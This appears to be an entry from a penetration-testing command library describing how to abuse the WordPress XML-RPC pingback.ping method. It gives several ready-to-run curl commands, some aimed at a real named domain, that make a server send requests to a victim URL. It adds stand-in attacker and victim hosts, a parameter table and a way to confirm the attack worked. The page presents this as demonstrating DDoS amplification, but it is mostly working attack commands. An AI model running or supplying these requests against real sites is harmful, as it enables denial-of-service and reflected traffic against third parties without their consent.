---
data: >-
  curl -X POST https://nordvpn.com/xmlrpc.php -H "Content-Type: text/xml" -d
  '<methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://your-server.com/payload</string></value></param><param><value><string>https://victim-site.com</string></value></param></params></methodCall>'
  -v
tags:
  - ddos
  - xmlrpc
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:56.545Z'
id: 05d6070d-4eb5-4381-9152-bfce84a304dd
verified: false
validated: true
submitted: true
---
# trigger-pingback-ping

## Command

```bash
curl -X POST https://nordvpn.com/xmlrpc.php \
  -H "Content-Type: text/xml" \
  -d '<methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://your-server.com/payload</string></value></param><param><value><string>https://victim-site.com</string></value></param></params></methodCall>' -v
```

## Description

Triggers the pingback.ping XML-RPC method to force the server to send an HTTP request to a victim URL, useful for demonstrating DDoS amplification on enabled WordPress xmlrpc.php endpoints.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP POST method | Yes |
| `-H "Content-Type: text/xml"` | XML header | Yes |
| `-d '...' ` | Payload with source and target URLs | Yes |
| `-v` | Verbose mode | No |
| Source URL | Attacker's server (e.g., http://your-server.com) | Yes |
| Target URL | Victim site (e.g., https://victim-site.com) | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://example.com/xmlrpc.php -H "Content-Type: text/xml" -d '<methodCall><methodName>pingback.ping</methodName><params><param><string>http://source.com</string></param><param><string>https://target.com</string></param></params></methodCall>'
```

### Advanced Usage

```bash
curl -X POST https://nordvpn.com/xmlrpc.php -H "Content-Type: text/xml" -H "User-Agent: Mozilla/5.0" -d '<methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://attacker.com/large-payload</string></value></param><param><value><string>https://victim.com</string></value></param></params></methodCall>' --max-time 10
```

## Expected Output

XML response indicating success or fault, e.g., <fault><value><struct><member><name>faultCode</name><value><int>0</int></value></member></struct></value></fault>. Verify by observing GET request to target from server's IP.

## Related

- [[Related Procedure|procedures/Demonstrate-DDoS-via-Pingback-ping]]
